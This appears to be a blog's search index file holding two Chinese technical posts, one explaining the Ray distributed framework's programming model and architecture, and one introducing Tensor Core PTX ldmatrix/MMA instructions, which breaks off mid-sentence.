<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Ray 框架初步认知与理解</title>
    <link href="/2025/10/04/2025-10-04-ray/"/>
    <url>/2025/10/04/2025-10-04-ray/</url>
    
    <content type="html"><![CDATA[<h1>Ray 框架内部原理理解</h1><p>本文参考 <a href="https://arxiv.org/pdf/1712.05889">Ray 论文</a></p><h2 id="Ray-框架解决的需求">Ray 框架解决的需求</h2><p>最新的强化学习(RL)算法强调让 AI 通过与环境的不断交互来学习提升自己。其核心目标是要让 AI 学习一个策略，这个策略将根据环境的变化，让 AI 自主做出相关的应对动作，并在环境中不断提升应对策略，久而久之 AI 将学会一个有效的任务（例如赢得游戏或驾驶一架无人机）。在大规模的应用中，寻找有效的策略需要三大能力：</p><ol><li><p>模拟仿真（或者说 Rollout）。RL方法通常依赖于大量模拟来评估一个策略。仿真能够让智能体去探索众多不同的动作选择序列，并能够了解这些选择对于实现目标有怎样的长期影响。</p></li><li><p>分布式训练。在强化学习中，完成策略评估后，需要对策略做改进，这些改进通常是通过训练深度神经网络的方法来进行的，训练使用的数据来自 1 中仿真过程或与物理环境的交互。</p></li><li><p>服务部署。RL 策略的最终目的是要为控制问题提供解决方案，因此在训练完成之后还需要将策略作为服务部署，应用于交互式的闭环或开环的控制问题场景。</p></li></ol><p>强化学习的上述特征对框架提出了新的系统需求：</p><ol><li><p>支持细粒度的计算。即单次计算任务非常轻量，但是所需计算的次数十分庞大，例如与真实世界进行大量的动作交互，或进行大量的仿真。</p></li><li><p>支持对于时间和资源的非均匀使用 (heterogeneity)。例如一次仿真可能只需要几毫秒，也可能需要好几个小时；仿真主要使用CPU，而训练则主要使用GPU.</p></li><li><p>支持动态执行。仿真结果或与环境交互的结果可能会实时地影响后续的计算任务。</p></li></ol><h2 id="Ray-框架简介">Ray 框架简介</h2><p>Ray 是为满足上面这些需求而开发的通用集群计算框架，既支持模型的训练，又支持对环境的仿真或与环境的交互，还支持模型服务。</p><p>Ray 所面临的任务涵盖了从<strong>轻量级、无状态</strong>的计算任务（例如仿真）到<strong>长时间运行的、有状态</strong>的计算任务（例如训练）。</p><p>为此，Ray 实现了一套统一的接口，这套接口既能表达基于任务的并行计算(task-parallel)，又能表达基于行动器的并行计算(actor-based)。</p><p>前者使得 Ray 能高效地、动态地对仿真、高维状态输入处理（如图像、视频）和错误恢复等任务进行负载均衡，后者行动器的设计使得 Ray 能有效地支持有状态的计算，例如模型训练、与客户端共享可变状态（如参数服务器）。Ray 在一个具有高可扩展性和容错性的动态执行引擎上实现了对任务和行动器的抽象。</p><h2 id="Ray-编程模型">Ray 编程模型</h2><p>正如上文需求分析中所述，Ray 中有两个重要的概念：任务(Task)和行动器(Actor)。Ray 编程模型是指 Ray 框架基于任务和行动器这两个重要需求所向用户提供的一套 API 及其编程范式。下表展示了 Ray 提供的核心API，详细参考 <a href="https://docs.ray.io/en/latest/ray-core/tips-for-first-time.html">Ray 文档</a>。</p><table><thead><tr><th>API</th><th>Description</th></tr></thead><tbody><tr><td>ray.init()</td><td>初始化 Ray</td></tr><tr><td>@ray.remote</td><td>函数或类的装饰器，加上后可以在其他进程上执行</td></tr><tr><td>.remote()</td><td>每个 remote 函数的后缀，remote 函数会被异步调用</td></tr><tr><td>ray.put()</td><td>将传入的参数同步地保存起来，返回 ID</td></tr><tr><td>ray.get()</td><td>阻塞直到远端将计算得到的值传回来</td></tr><tr><td>ray.wait()</td><td>等待返回已经就绪的值</td></tr></tbody></table><p>具体来说，使用时需牢记：任务是无状态的远程函数。远程函数被调用时无法立即返回值（因为它是远端的），只能先给一个 future 对象，真正的返回值需通过 <code>ray.get(&lt;future对象&gt;)</code> 的方式来获取。</p><p>这样的编程模型既允许用户编写并行计算代码，同时又提醒用户要关注数据之间的依赖性。</p><p>任务的编程范式如下：</p><ol><li>注册任务：在需要注册为任务的函数上加上 <code>@ray.remote</code> 装饰器</li><li>提交任务：在调用具有 <code>@ray.remote</code> 装饰器的函数时，需要带上 <code>.remote()</code> 而不是直接调用</li><li>非阻塞提交：无论任务的运行需要多少时间，在提交任务后都会立即返回一个 ObjectRef 对象</li><li>按需阻塞获取结果：在你需要函数的返回值时，可以通过 <code>ray.get</code> 来获取</li></ol><p>以下代码是一个任务从注册到运行完成获得结果的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@ray.remote</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x * x<br><br>object_ref = f.remote(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">assert</span> ray.get(object_ref) == <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>任务是无状态的，任务所操作的对象都可以看作不可变对象(Immutable Objects)，或者任务调用可以看作一个无副作用的(Side-effect Free)表达式，任务的输出（返回值）仅与输入（实参）有关。</p><p>任务的设计使得 Ray 具备以下能力：</p><ol><li>细粒度负载均衡：利用任务级粒度的负载感知调度来进行细粒度的负载均衡</li><li>输入数据本地化：每个任务可以在存有它所需要的数据的节点上调度</li><li>较低的恢复开销：无需记录检查点或恢复到中间状态</li></ol><p>行动器是有状态的，每个行动器都有一些可供远程调用的函数，类似于任务中的远程函数，不同的是，使用 <code>f.remote</code> 顺序地提交若干个远程函数后，这些函数是并行执行的，但在同一个 actor 下使用<code>actor.method.remote</code> 顺序地提交若干个远程方法后，这些方法将串行地执行。但不同 actor 之间的调用是可以并行的。可以用一个图来描述任务和行动器的区别和联系：</p><p><img src="/img/LLM/ray-actor-tasks.png" alt="Ray Actor &amp; Task"></p><p>行动器的编程范式如下：</p><ol><li>注册行动器：在需要注册为行动器的类上加上@ray.remote装饰器</li><li>实例化行动器：相比于普通Python类的实例化，需要在类名后加上.remote</li><li>提交方法调用：调用行动器的方法时，同样需要带上.remote()而不是直接调用</li><li>非阻塞提交：无论方法的运行需要多少时间，在提交任务后都会立即返回一个ObjectRef对象（同一行动器实例下，方法会按照提交顺序串行地运行）</li><li>按需阻塞获取结果：在需要方法运行的返回值时，可以通过ray.get来获取</li></ol><p>以下代码是一个行动器从注册到运行完成获得结果的示例，且展示了行动器方法的串行性质：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@ray.remote</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.value = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params">self</span>):<br>        self.value += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> self.value<br><br>counter = Counter.remote()<br><br>refs = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    ref = counter.increment.remote()<br>    refs.append(ref)<br><br><span class="hljs-keyword">for</span> i, ref <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(refs):<br>    <span class="hljs-keyword">assert</span> ray.get(ref) == i + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>行动器使得 Ray 具备更高效的细粒度更新能力。因为它是一种高内聚的设计，状态与可能改变状态的操作被设计在一个类中，使得这些操作不依赖于外界的状态，从而在更新状态时省去了许多序列化和反序列化的开销。</p><p>举例说，在使用行动器来实现参数服务器时，参数是有状态的，在 PyTorch 中，分布式训练的每个训练进程都维护了一份参数信息，并且都各自计算出一个梯度，进程之间需要交换梯度信息以计算出总梯度和更新后的参数，这就意味着梯度需要被序列化和反序列化以便在进程间传递。而使用行动器时，整个系统中只维护<strong>一份参数信息</strong>，并且对于同一份参数的更新操作都是串行的。另外，提交参数更新的请求是非阻塞的，因此在提交完后还可以并行地去做其他 CPU 密集型的任务，这也是 Ray 框架异构性的体现。</p><h2 id="Ray-计算模型">Ray 计算模型</h2><p>Ray 采用动态任务图计算模型，在这一模型中，当输入数据就绪时，系统将自动触发相应的远程函数和行动器方法的执行。本节将介绍计算图是如何在用户程序中构建的。</p><p>首先，不考虑行动器，计算图的节点可以分为两类：数据对象和远程函数调用（任务）。同样地，边也可以分为两类：数据边和控制边。</p><p>数据边用来记录数据和任务之间的依赖关系，如果数据对象 D 是任务 T 的输出，那么就增加一条从 T 指向 D 的边；反之如果是输入，则增加 D 指向 T 的边。</p><p>控制边用来记录任务之间嵌套调用的依赖关系。如果任务 T1 调用了任务 T2，则增加一条 T1 指向 T2 的边。</p><p>然后我们再考虑行动器，其方法的调用也表示为节点，它们与远程函数基本相同，只是为了记录同一行动器上的后续方法调用之间的状态依赖关系，需要增加第三种类型的边：状态边。<br>如果方法 Mj 紧接着 Mi 之后调用，且这两个方法属于同一个行动器，那么就增加一条 Mi 指向 Mj 的边。如此，状态边将同一行动器下的方法调用组织成链式结构，这一链式结构记录了方法的调用顺序。</p><p>下面的 Python 代码搭建了一个基本的 RL 训练框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@ray.remote</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_policy</span>():<br>    <span class="hljs-comment"># 随机初始化策略</span><br>    <span class="hljs-keyword">return</span> policy<br><br><span class="hljs-meta">@ray.remote(<span class="hljs-params">num_gpus=<span class="hljs-number">1</span></span>)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Simulator</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 初始化环境</span><br>        self.env = Environment()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rollout</span>(<span class="hljs-params">self, policy, num_steps</span>):<br>        observations = []<br>        observation = self.env.current_state()<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_steps):<br>            action = policy(observation)<br>            observation = self.env.step(action)<br>            observations.append(observation)<br>        <span class="hljs-keyword">return</span> observations<br><br><span class="hljs-meta">@ray.remote(<span class="hljs-params">num_gpus=<span class="hljs-number">2</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_policy</span>(<span class="hljs-params">policy, *rollouts</span>):<br>    <span class="hljs-comment"># 更新策略</span><br>    <span class="hljs-keyword">return</span> policy<br><br><span class="hljs-meta">@ray.remote</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_policy</span>():<br>    <span class="hljs-comment"># 创建策略</span><br>    policy_id = create_policy.remote()<br>    <span class="hljs-comment"># 创建10个行动器(仿真器)</span><br>    simulators = [Simulator.remote() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>    <span class="hljs-comment"># 做100次训练</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        <span class="hljs-comment"># 每个行动器做一次预演</span><br>        rollout_ids = [s.rollout.remote(policy_id) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> simulators]<br>        <span class="hljs-comment"># 使用预演生成的轨迹来更新策略</span><br>        policy_id = update_policy.remote(policy_id, *rollout_ids)<br>    <span class="hljs-keyword">return</span> ray.get(policy_id)<br></code></pre></td></tr></table></figure><p><img src="/img/LLM/ray_graph.png" alt="Ray Graph"></p><p>图中的主任务是 T0，T0 中创建了策略（任务），并实例化了若干个模拟器（行动器）A10，A20 （图中为了简便且不失一般性只画了两个），这些过程都是并行的。</p><p>然后进入策略评估和策略改进的循环中。策略评估需要策略作为输入，并输出 rollout 的结果，而策略改进需要策略和众多 rollout 结果作为输入。我们把 A1k，Ank 称为第 k 批 rollout，从而可以知道，每一批 rollout 都是基于同一个策略进行的，而必须等前一批 rollout 被用于更新策略后，下一批 rollout 才能基于新的策略开始。</p><p>相比完全串行的策略学习方法，这种并行化的设计主要是将 rollout 批量化并行，从而增加单位时间内采样的数量，从而加速策略改进的过程。</p><h2 id="Ray-架构">Ray 架构</h2><p>Ray的架构由应用层和系统层组成，其中应用层实现了Ray的API，作为前端供用户使用，而系统层则作为后端来保障Ray的高可扩展性和容错性。整体的架构图如下图所示：</p><p><img src="/img/LLM/ray_arch.png" alt="Ray Arch"></p><h3 id="应用层">应用层</h3><p>应用层中有三种类型的进程：</p><ol><li>驱动器进程 (Driver): 执行用户程序的进程。所有操作都需要由主进程来驱动。</li><li>工作器进程 (Worker): 调用任务（远程函数）的无状态进程。Worker 由 Driver 或另一个 worker 分配任务并自动启动。当声明一个远程函数时，该函数将被自动发布到所有的 workers 中。在同一个 worker 中，任务是串行地执行的，worker 并不维护其任务与任务之间的局部状态，即在 worker 中，一个远程函数执行完后，其局部作用域的所有变量将不再能被其他任务所访问。</li><li>行动器进程 (Actor): actor 被调用时只执行其所暴露的方法。actor 由 worker 或 driver 显式地进行实例化。与 worker 相同的是，actor 也会串行地执行任务，不同的是 actor 上执行的每个方法都依赖于其前面所执行的方法所导致的状态。</li></ol><p>三种进程体现到Python代码中如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@ray.remote</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-comment"># ==== 工作器进程 ====</span><br>    <span class="hljs-keyword">return</span> x * x<br><br><span class="hljs-meta">@ray.remote</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># ==== 行动器进程 ====</span><br>        self.value = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># ==== 行动器进程 ====</span><br>        self.value += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> self.value<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># ==== 驱动器进程 ====</span><br>    object_ref = f.remote(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">assert</span> ray.get(object_ref) == <span class="hljs-number">4</span><br><br>    counter = Counter.remote()<br>    refs = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        ref = counter.increment.remote()<br>        refs.append(ref)<br>    <span class="hljs-keyword">for</span> i, ref <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(refs):<br>        <span class="hljs-keyword">assert</span> ray.get(ref) == i + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="系统层">系统层</h3><p>系统层由三个主要部件组成：全局控制存储器 (Global Control Store)、分布式调度器 (Distributed Scheduler)和分布式对象存储器 (Distributed Object Store)。这些部件在横向上是可扩展的，即可以增减这些部件的数量，同时还具有一定的容错性。</p><h3 id="GCS">GCS</h3><p>GCS 设计的初衷是让系统中的各个组件都变得尽可能地无状态，因此 GCS 维护了一些全局状态：</p><ul><li>对象表 (Object Table)：记录每个对象存在于哪些节点</li><li>任务表 (Task Table)：记录每个任务运行于哪个节点</li><li>函数表 (Function Table)：记录用户进程中定义的远程函数</li><li>事件日志 (Event Logs)：记录任务运行日志</li></ul><h3 id="分布式调度器">分布式调度器</h3><p>Ray 中的任务调度器被分为两层，由一个<strong>全局调度器</strong>和<strong>每个节点各自的局部调度器</strong>组成。为了避免全局调度器负载过重，在节点创建的任务首先被提交到局部调度器，如果该节点没有过载且节点资源能够满足任务的需求（如 GPU 的需求），则任务将在本地被调度，否则任务才会被传递到全局调度器，考虑将任务调度到远端。由于 Ray 首先考虑在本地调度，本地不满足要求才考虑在远端调用，因此这样的调度方式也被称为自底向上的调度。</p><p>下图展示了 Ray 的调度过程，<strong>箭头的粗细表示过程发生频率的高低</strong>。用户进程和工作器向本地调度器提交任务，大多数情况下，任务将在本地被调度。少数情况下，局部调度器会向全局调度器提交任务，并向 GCS 传递任务的相关信息，将任务涉及的对象和函数存入全局的对象表和函数表中，然后全局调度器会从 GCS 中读取到信息，并选择在其他合适的节点上调度这一任务。更具体地来说，全局调度器会根据任务的请求选出具有足够资源的一系列节点，并在这些节点中选出等待时间最短的一个节点。</p><p><img src="/img/LLM/ray_dist_scheduler.png" alt="Ray dist scheduler"></p><h3 id="分布式对象存储器">分布式对象存储器</h3><p>Ray 实现了一个内存式的分布式存储系统来存储每个任务的输入和输出。Ray 通过内存共享机制在每个节点上实现了一个对象存储器 (Object Store)，从而使在同一个节点运行的任务之间不需要拷贝就可以共享数据。当一个任务的输入不在本地时，则会在执行之前将它的输入复制到本地的对象存储器中。同样地，任务总会将输出写入到本地的对象存储器中。这样的复制机制可以减少任务的执行时间，因为任务永远只会从本地对象存储器中读取数据（否则任务不会被调度），并且消除了热数据可能带来的潜在的瓶颈。</p><h2 id="案例">案例</h2><p>最后，我们来看两个实际例子来结束这篇博客：</p><p>假设有一个求两数之和的任务需要交给Ray来执行，我们来具体分析一下这一任务在Ray的架构中是如何执行的。以下以全局调度为例，因为它更具有一般性。</p><p><img src="/img/LLM/ray_task.png" alt="Ray Task"></p><p>图(a)描述了任务的定义、提交和执行的过程</p><ol start="0"><li>【定义远程函数】位于 N1 的用户程序中定义的远程函数add被装载到GCS的函数表中，位于 N2 的工作器从 GCS 中读取并装载远程函数add</li><li>【提交任务】位于 N1 的用户程序向本地调度器提交 add(a, b) 的任务</li><li>【提交任务到全局】本地调度器将任务提交至全局调度器</li><li>【检查对象表】全局调度器从GCS中找到add任务所需的实参a, b，发现 a 在 N1 上，b 在 N2 上（a, b 已在用户程序中事先定义）</li><li>【执行全局调度】由上一步可知，任务的输入平均地分布在两个节点，因此全局调度器随机选择一个节点进行调度，此处选择了 N2</li><li>【检查任务输入】 N2 的局部调度器检查任务所需的对象是否都在 N2 的本地对象存储器中</li><li>【查询缺失输入】 N2 的局部调度器发现任务所需的a不在 N2 中，在 GCS 中查找后发现 a 在 N1 中</li><li>【对象复制】将 a 从 N1 复制到 N2</li><li>【执行局部调度】在 N2 的工作器上执行add(a, b)的任务</li><li>【访问对象存储器】add(a, b)访问局部对象存储器中相应的对象</li></ol><p><img src="/img/LLM/ray_task_1.png" alt="Ray task"></p><p>图(b)描述了获取任务执行结果的的过程</p><ol><li>【提交get请求】向本地调度器提交 ray.get 的请求，期望获取 add 任务执行的返回值</li><li>【注册回调函数】 N1 本地没有存储返回值，所以根据返回值对象的引用 id_c 在 GCS 的对象表中查询该对象位于哪个节点，假设此时任务没有执行完成，那么对象表中找不到 id_c，因此 N1 的对象存储器会注册一个回调函数，当 GCS 对象表中出现 id_c 时触发该回调，将c从对应的节点复制到 N1 上</li><li>【任务执行完毕】 N2 上的 add 任务执行完成，返回值c被存储到 N2 的对象存储器中</li><li>【将对象同步到GCS】 N2 将 c 及其引用 id_c 存入 GCS 的对象表中</li><li>【触发回调函数】2中注册的回调函数被触发</li><li>【执行回调函数】将c从 N2 复制到 N1</li><li>【返回用户程序】将c返回给用户程序，任务结束</li></ol>]]></content>
    
    
    <categories>
      
      <category>RL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 MMA 的 flash-attn 实现</title>
    <link href="/2025/03/09/2025-3-9-mma/"/>
    <url>/2025/03/09/2025-3-9-mma/</url>
    
    <content type="html"><![CDATA[<h1>Tensor Core 与 MMA</h1><p>自 Volta 架构开始，nvidia 在显卡上装上了 Tensor Core 架构。该架构是为满足深度学习中所需的大量矩阵类运算需求而设计的硬件架构，专门提供高效小块的矩阵乘法：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><mi>A</mi><mo>×</mo><mi>B</mi><mo>+</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">D=A\times B+C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>。</p><p>因为深度学习中高精度 float 运算不是必须的，所以 Tensor Core 还支持更低精度的计算，更低精度的计算意味着更高的计算效率，更少的能量消耗。</p><p><img src="/img/LLM/tensor_core.gif" alt=""></p><p>来自<a href="https://www.youtube.com/watch?v=yyR0ZoCeBO8">NVIDIA 的 Tensor Core 油管视频</a>。</p><p>Tensor Core 提供了两种使用方法。第一种是利用 nvidia 提供的矩阵计算库 cublas 和深度学习库 cudnn，它们封装了常用的矩阵类计算和深度学习计算所需要的函数，以 SDK 的形式提供封装的接口。这里可以参考 <a href="https://blog.csdn.net/CV_Autobot/article/details/138460383">Tensor Core 的三种用法</a></p><p>第二种是通过CUDA编程提供的特定的接口和PTX汇编实现。对于第二种形式，CUDA编译器 nvcc 提供了 WMMA（Warp Matrix Multiply Accumulate）和 MMA（Matrix Multiply Accumulate）两种形式，第一种形式是通过提供fragment数据表示和特定的 <code>load_matrix_sync()</code>、<code>store_matrix_sync()</code>、<code>mma_sync()</code> 数据加载存储和计算API来触发对 Tensor Core的编程。另一种是通过 PTX 汇编实现，其数据直接面向寄存器表示，计算则是通过 <code>mma.sync</code> 类的函数实现。WMMA 形式对数据和API都进行了相应的抽象，编程相对简单，但对指令单控制也相对粗糙。MMA 形式的编程直接面向寄存器表示和汇编指令，难道较大，容易出错，但是可以实现精细的控制从而达到更高的计算效率。</p><h1>MMA 指令入门</h1><p>先具体介绍一下 PTX 汇编实现的 MMA 指令。毕竟目前 LLM 大火导致大家对 attention 计算速度和实现灵活性有了更加极致追求，用其他的方式实现的 attention 已经不能令全球 geek 们满意了。</p><h2 id="ldmatrix">ldmatrix</h2><p>指令格式：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ldmatrix.sync.aligned.shape.num&#123;<span class="hljs-string">.trans</span>&#125;&#123;<span class="hljs-string">.ss</span>&#125;<span class="hljs-string">.type</span> r, [p];<br><br><span class="hljs-string">.shape</span>   = &#123;<span class="hljs-string">.m8n8</span>, <span class="hljs-string">.m16n16</span>&#125;;<br><span class="hljs-string">.num</span>     = &#123;<span class="hljs-string">.x1</span>, <span class="hljs-string">.x2</span>, <span class="hljs-string">.x4</span>&#125;;<br><span class="hljs-string">.ss</span>      = &#123;<span class="hljs-string">.shared</span>&#123;:<span class="hljs-function">:cta</span>&#125;&#125;;<br><span class="hljs-string">.type</span>    = &#123;<span class="hljs-string">.b16</span>, <span class="hljs-string">.b8</span>&#125;;<br><span class="hljs-string">.dst_fmt</span> = &#123; <span class="hljs-string">.b8x16</span> &#125;;<br><span class="hljs-string">.src_fmt</span> = &#123; <span class="hljs-string">.b6x16_p32</span>, <span class="hljs-string">.b4x16_p64</span> &#125;;<br></code></pre></td></tr></table></figure><p>ldmatrix指令的使用格式例子: <code>ldmatrix.sync.aligned.m8n8.x1.shared.b16 &#123; %0 &#125;, [ %1 ];</code><br>这条 PTX 指令掺杂了太多信息，让我们逐个分析：</p><ul><li>ldmatrix：PTX 指令名字，说明该指令用于 load matrix</li><li>sync 同步而非异步执行的，即 Warp 内所有的线程必须都完成后才能再往下执行</li><li>aligned 需要 Warp 内所有线程执行相同的 ldmatrix 指令</li><li>m8n8 意思是矩阵的数据维度，必须是 8 行 8 列</li><li>x1：加载的矩阵数量，表示一个</li><li>shared：从 shared memory 中加载</li><li>b16：数据类型为 bfloat16，即bf16</li><li>%0, %1 是占位符，分别对应输出和输入操作数。PTX 汇编本身不会直接使用 {}，[] 用于表示 内存地址访问 或 间接寻址 。它类似于 C/C++ 中的数组下标操作，用于从内存中加载数据或将数据存储到内存中</li></ul><p>总结下来，可以这么说，该指令让一个 Warp（32个线程），从 Shared Memory 的 [p] 地址中加载 1 个 8*8(m8n8) 的矩阵（必须要求该矩阵的每行必须连续存放，但行间可以不连续存放），存放到了目标寄存器 %0 中。</p><p>那我们来继续分析一下这条指令的其他细节，首先 m8n8 的 bf16 矩阵有 64 个数据元素，每个元素占两个字节，一共 128 个字节，每个线程获得 2 个元素。</p><p>因为行间的位置可以不连续，所以需要用户确保 thread0-thread7 的 %1 寄存器填充的是8个行首地址，其他情况见下面表格。</p><table><thead><tr><th>.num</th><th>Threads 0–7</th><th>Threads 8–15</th><th>Threads 16–23</th><th>Threads 24–31</th></tr></thead><tbody><tr><td>.x1</td><td>addr0–addr7</td><td>–</td><td>–</td><td>–</td></tr><tr><td>.x2</td><td>addr0–addr7</td><td>addr8–addr15</td><td>-</td><td>–</td></tr><tr><td>.x4</td><td>addr0–addr7</td><td>addr8–addr15</td><td>addr16–addr23</td><td>addr24–addr31</td></tr></tbody></table><p>读取矩阵时，四个连续的线程会先加载连续的一行，即 8 个元素 16 个字节。线程 0 的 %0 会获得头两个元素，其他线程情况见下表：</p><table><thead><tr><th>Row\Col</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>0</td><td>T0:r</td><td>T0:r</td><td>T1:r</td><td>T1:r</td><td>T2:r</td><td>T2:r</td><td>T3:r</td><td>T3:r</td></tr><tr><td>1</td><td>T4:r</td><td>T4:r</td><td>T5:r</td><td>T5:r</td><td>T6:r</td><td>T6:r</td><td>T7:r</td><td>T7:r</td></tr><tr><td>2</td><td>T8:r</td><td>T8:r</td><td>T9:r</td><td>T9:r</td><td>T10:r</td><td>T10:r</td><td>T11:r</td><td>T11:r</td></tr><tr><td>3</td><td>T12:r</td><td>T12:r</td><td>T13:r</td><td>T13:r</td><td>T14:r</td><td>T14:r</td><td>T15:r</td><td>T15:r</td></tr><tr><td>4</td><td>T16:r</td><td>T16:r</td><td>T17:r</td><td>T17:r</td><td>T18:r</td><td>T18:r</td><td>T19:r</td><td>T19:r</td></tr><tr><td>5</td><td>T20:r</td><td>T20:r</td><td>T21:r</td><td>T21:r</td><td>T22:r</td><td>T22:r</td><td>T23:r</td><td>T23:r</td></tr><tr><td>6</td><td>T24:r</td><td>T24:r</td><td>T25:r</td><td>T25:r</td><td>T26:r</td><td>T26:r</td><td>T27:r</td><td>T27:r</td></tr><tr><td>7</td><td>T28:r</td><td>T28:r</td><td>T29:r</td><td>T29:r</td><td>T30:r</td><td>T30:r</td><td>T31:r</td><td>T31:r</td></tr></tbody></table><p>而对于 